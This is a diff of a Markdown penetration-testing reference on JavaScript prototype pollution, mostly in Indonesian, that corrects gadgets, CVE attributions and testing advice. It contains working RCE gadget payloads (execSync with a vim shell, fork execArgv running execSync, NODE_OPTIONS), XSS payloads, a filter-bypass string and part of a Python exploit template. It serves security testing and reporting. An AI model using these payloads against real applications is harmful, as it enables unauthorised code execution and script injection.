@@ -40,66 +40,60 @@ function merge(a, b) {
 
 ### Server-Side Prototype Pollution → RCE
 
-```javascript
-// RCE via prototype pollution + child_process gadget
-// Step 1: Pollute prototype
-const payload = {
-    "__proto__": {
-        "shell": "node",
-        "env": {
-            "NODE_OPTIONS": "--require /tmp/evil.js"
-        }
-    }
-};
+Polusi saja tidak mengeksekusi apa pun. Yang mengeksekusi adalah **gadget**: kode yang membaca opsi dari prototype. Gadget yang terdokumentasi (PortSwigger):
 
-// Step 2: Trigger child_process.spawn() or exec()
-// child_process reads options from prototype → executes evil.js
+```javascript
+// 1. execSync dengan shell + input → perintah dibaca dari prototype
+//    {"__proto__":{"shell":"vim","input":":! id\n"}}  (vim/ex sebagai shell)
+
+// 2. fork dengan execArgv
+//    {"__proto__":{"execArgv":["--eval=require('child_process').execSync('id')"]}}
+
+// 3. spawn dengan shell + NODE_OPTIONS
+//    {"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=COLLAB"}}
 ```
 
-**Common RCE gadgets**:
-```javascript
-// 1. child_process.exec() with shell option
-// 2. Template engine options (NODE_OPTIONS)
-// 3. HTTP headers (inject via prototype)
-// 4. Socket.IO configuration
-```
+Prasyarat: aplikasi memanggil `child_process` **setelah** polusi, memakai objek opsi yang tidak diisi eksplisit, pada proses Node yang sama. Tanpa itu, polusi hanya bertahan sampai proses mati.
 
 ### Client-Side Prototype Pollution → XSS
 
-```javascript
-// DOM-based XSS via prototype pollution
-{
-    "__proto__": {
-        "innerHTML": "<img src=x onerror=alert(1)>",
-        "src": "javascript:alert(1)"
-    }
-}
-
-// jQuery $() — DOM XSS
-{
-    "__proto__": {
-        "href": "javascript:alert(document.domain)"
-    }
-}
-```
-
-### Known CVEs
-
-- **CVE-2019-10744**: lodash.merge prototype pollution
-- **CVE-2020-8203**: lodash.zipObjectDeep
-- **CVE-2022-25883**: semver vulnerable to PP
-- **CVE-2019-10744**: lodash.merge + handlebars → RCE
-
-### Vulnerable Libraries
+Gadget DOM juga harus ada: kode yang membaca properti dari objek hasil merge lalu menuliskannya ke sink.
 
 ```javascript
-const vulnerable = [
-    'lodash.merge', 'lodash.defaultsDeep', 'lodash.set', 'lodash.zipObjectDeep',
-    'jquery', 'jquery-extend', 'mixin-deep', 'merge-deep', 'merge-options',
-    'object-assign-deep', 'defaults-deep', 'assign-deep', 'deep-extend',
-    'just-extend', 'angular', 'handlebars', 'immer'
-];
+// transport_url → script.src (contoh gadget yang terdokumentasi)
+// ?__proto__[transport_url]=data:,alert(1)//
 ```
+
+`{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}` **tidak otomatis** menjadi XSS: harus ada kode yang menyalin properti itu ke `innerHTML`. Cari pasangan merge → sink di bundle, jangan berasumsi.
+
+### Catatan parsing yang menentukan
+
+- `JSON.parse` menyimpan `__proto__` sebagai **own property**; yang membuangnya adalah skema validasi, `qs` (`allowPrototypes:false`), atau body-parser — bukan JSON itu sendiri.
+- `Object.assign` dangkal memakai `[[Set]]`, sehingga `Object.assign({}, JSON.parse('{"__proto__":{"x":1}}'))` hanya mengganti prototype objek target (lokal). Polusi global butuh rekursi, target berupa prototype, atau key `constructor` → `prototype`.
+- Bypass filter sekali-jalan: `__pro__proto__to__` yang setelah `replace` menjadi `__proto__`; `--disable-proto=delete` masih bisa dilewati lewat `constructor.prototype`.
+
+### CVE yang terverifikasi (NVD)
+
+| CVE | Paket | Versi rentan | Fungsi | Dampak |
+|---|---|---|---|---|
+| CVE-2018-3721 | lodash | < 4.17.5 | `merge`, `mergeWith`, `defaultsDeep` | PP |
+| CVE-2019-10744 | lodash | < 4.17.12 | `defaultsDeep` | PP (CVSS 9.1) |
+| CVE-2020-8203 | lodash | < 4.17.20 | `zipObjectDeep` | PP |
+| CVE-2019-11358 | jQuery | < 3.4.0 | `$.extend(true, ...)` | PP |
+| CVE-2018-3750 | deep-extend | ≤ 0.5.0 | — | PP (9.8) |
+| CVE-2019-10746 | mixin-deep | < 1.3.2, 2.0.0 | — | PP (9.8) |
+| CVE-2021-23440 | set-value | < 2.0.1, ≥3.0.0 <4.0.1 | — | PP (9.8) |
+| CVE-2021-44906 | minimist | ≤ 1.2.5 | `setKey` | PP (9.8) |
+| CVE-2022-29078 | ejs | 3.1.6 | `outputFunctionName` | SSTI → RCE |
+| CVE-2021-23369 | handlebars | < 4.7.7 | rantai konstruktor | RCE (**SSTI**, bukan PP) |
+
+**Bukan prototype pollution:** CVE-2022-25883 adalah ReDoS pada `semver` (`new Range`), bukan PP. Jangan memasukkannya ke daftar ini.
+
+### Library yang diperiksa
+
+`lodash` (`merge`, `mergeWith`, `defaultsDeep`, `set`, `zipObjectDeep`), `jquery` (`$.extend(true, ...)`), `deep-extend`, `mixin-deep`, `set-value`, `minimist`, `merge-deep`, `merge-options`, `assign-deep`, `defaults-deep`, `just-extend`, `object-assign-deep`.
+
+Daftar ini hanya kandidat; versi menentukan. `handlebars` dan `ejs` masuk kategori **SSTI**, bukan PP — bedakan agar laporan tidak salah kelas.
 
 ### Exploit Template (Server-Side PP)
 
@@ -123,3 +117,19 @@ def exploit():
     r = requests.post(TARGET, json=payload)
     return r
 ```
+
+## Best Practices
+
+- Bedakan polusi, mass assignment, dan SSTI; ketiganya punya jalur mitigasi berbeda.
+- Cari gadget sebelum mengklaim RCE: polusi tanpa gadget hanya mengubah state proses.
+- Verifikasi versi paket sebelum mengutip CVE; satu CVE sering menempel pada fungsi tertentu.
+- Uji non-destruktif lebih dulu (override status, header charset), baru gadget yang mengeksekusi.
+- Tandai klaim versi yang belum dicek dengan [UNVERIFIED] dan jangan bawa ke laporan klien.
+- Ingat polusi bertahan selama proses hidup; restart target menghapus bukti — ambil bukti saat masih berlaku.
+
+## Rujukan
+
+- [injection-attacks.md](./injection-attacks.md) — SSTI Handlebars dengan rantai konstruktor.
+- [waf-bypass-payloads.md](./waf-bypass-payloads.md) — bila payload difilter WAF.
+- PortSwigger: prototype pollution (client-side, server-side).
+- NVD untuk setiap CVE yang dikutip.
